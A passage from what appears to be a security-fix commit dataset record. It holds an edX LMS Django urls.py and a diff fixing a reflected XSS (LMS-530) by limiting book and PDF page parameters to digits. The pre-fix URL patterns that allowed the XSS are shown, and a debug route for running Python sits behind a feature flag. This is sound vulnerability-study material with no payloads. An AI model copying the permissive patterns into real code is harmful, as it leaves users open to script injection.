settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"}, "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {"url": "https://api.github.com/repos/h4ppyy/m-mooc/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "html_url": "https://github.com/h4ppyy/m-mooc/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             